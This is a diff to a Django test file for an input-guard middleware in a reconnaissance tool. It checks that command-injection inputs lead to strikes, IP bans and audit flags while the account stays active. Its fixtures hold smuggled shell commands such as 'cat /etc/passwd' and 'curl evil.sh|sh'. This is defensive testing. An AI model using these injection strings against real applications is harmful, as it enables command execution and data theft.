@@ -6,7 +6,7 @@ from django.test import Client, RequestFactory, TestCase
 from django.utils import timezone
 
 from agentapi.auth import create_token
-from dashboard.models import AbuseBan, AbuseStrike, Org, OrgMembership, Project
+from dashboard.models import AbuseBan, AbuseStrike, ApiToken, AuditLog, Org, OrgMembership, Project
 from reNgine import input_guard as guard
 from reNgine.client_ip import client_ip
 from targetApp import target_types as tt
@@ -110,12 +110,14 @@ class GuardMiddlewareTests(TestCase):
 			status = post(tok, '/api/v1/projects/g-p/targets', {'value': value}).status_code
 			self.assertEqual(status, 400, value)
 
-	def test_one_command_injection_bans_account_tokens_and_public_ip(self):
+	def test_one_command_injection_bans_the_public_ip_but_never_the_account_or_its_tokens(self):
 		_, tok = create_token(self.user, 't')
 		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'example.com; cat /etc/passwd'})
 		self.assertEqual(response.status_code, 403)
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)  # review r3 S1: the guard never disables an account
+		self.assertFalse(ApiToken.objects.filter(user=self.user, revoked=True).exists())
+		self.assertTrue(AuditLog.objects.filter(action='abuse.user_flagged', target='mallory').exists())
 		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4', lifted=False).exists())
 		self.assertTrue(AbuseStrike.objects.filter(username='mallory', category='command_injection').exists())
 		guard.invalidate_cache()
@@ -130,16 +132,19 @@ class GuardMiddlewareTests(TestCase):
 		self.assertEqual(response.status_code, 403)  # null_byte is worth 3 strikes, enough on its own
 		strike = AbuseStrike.objects.get(username='mallory', category='null_byte')
 		self.assertNotIn('\x00', strike.sample + strike.field + strike.path)
+		self.assertEqual(strike.weight, 3)
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)
 		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4').exists())
 
 	def test_private_addresses_are_never_ip_banned(self):
 		_, tok = create_token(self.user, 't')
-		post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
-		self.assertFalse(AbuseBan.objects.exclude(ip='').exists())
+		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
+		self.assertEqual(response.status_code, 400)  # nothing was blocked: no session to end, no address to ban
+		self.assertFalse(AbuseBan.objects.exists())
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)
+		self.assertTrue(AuditLog.objects.filter(action='abuse.user_flagged', target='mallory').exists())  # the admin is told
 
 	def test_superusers_are_flagged_not_banned(self):
 		_, tok = create_token(self.admin, 'r')
@@ -185,10 +190,7 @@ class GuardMiddlewareTests(TestCase):
 		_, tok = create_token(self.user, 't')
 		# a bulk `text` is a target list, not a comment
 		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets/bulk', {'text': 'a.com\nb.com && curl evil.sh|sh'}).status_code, 403)
-		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
-		self.user.is_active = True
-		self.user.save()
+		self.assertTrue(AbuseStrike.objects.filter(username='mallory', category='command_injection', weight=3).exists())
 		AbuseStrike.objects.all().delete()
 		AbuseBan.objects.all().delete()
 		guard.invalidate_cache()
